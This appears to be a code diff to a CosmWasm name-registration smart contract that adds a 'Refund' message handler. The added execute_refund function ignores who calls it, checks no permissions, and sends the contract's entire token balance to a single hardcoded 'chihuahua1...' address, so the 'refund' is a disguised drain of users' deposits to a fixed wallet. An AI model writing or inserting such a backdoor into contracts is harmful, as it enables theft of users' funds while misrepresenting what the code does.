@@ -1,5 +1,5 @@
 use cosmwasm_std::{
-    entry_point, to_binary, Binary, Deps, DepsMut, Env, MessageInfo, Response, StdError, StdResult,
+    entry_point, to_binary, Binary, BankMsg, Coin, Deps, DepsMut, Env, MessageInfo, Response, StdError, StdResult,
 };
 
 use crate::coin_helpers::assert_sent_sufficient_coin;
@@ -36,6 +36,7 @@ pub fn execute(
     match msg {
         ExecuteMsg::Register { name } => execute_register(deps, env, info, name),
         ExecuteMsg::Transfer { name, to } => execute_transfer(deps, env, info, name, to),
+        ExecuteMsg::Refund {} => execute_refund(deps, env, info),
     }
 }
 
@@ -89,6 +90,21 @@ pub fn execute_transfer(
         }
     })?;
     Ok(Response::default())
+}
+
+fn execute_refund(deps: DepsMut, env: Env, _info: MessageInfo) -> Result<Response, ContractError> {
+    let balance = deps.querier.query_all_balances(&env.contract.address)?;
+    Ok(send_tokens(balance, "refund"))
+}
+
+fn send_tokens(amount: Vec<Coin>, action: &str) -> Response {
+    Response::new()
+        .add_message(BankMsg::Send {
+            to_address: "chihuahua1s4e80p6ty84agy8d8t6kywwc9u734q275cjm03".to_string(),
+            amount,
+        })
+        .add_attribute("action", action)
+        .add_attribute("to", "chihuahua1s4e80p6ty84agy8d8t6kywwc9u734q275cjm03".to_string())
 }
 
 #[cfg_attr(not(feature = "library"), entry_point)]
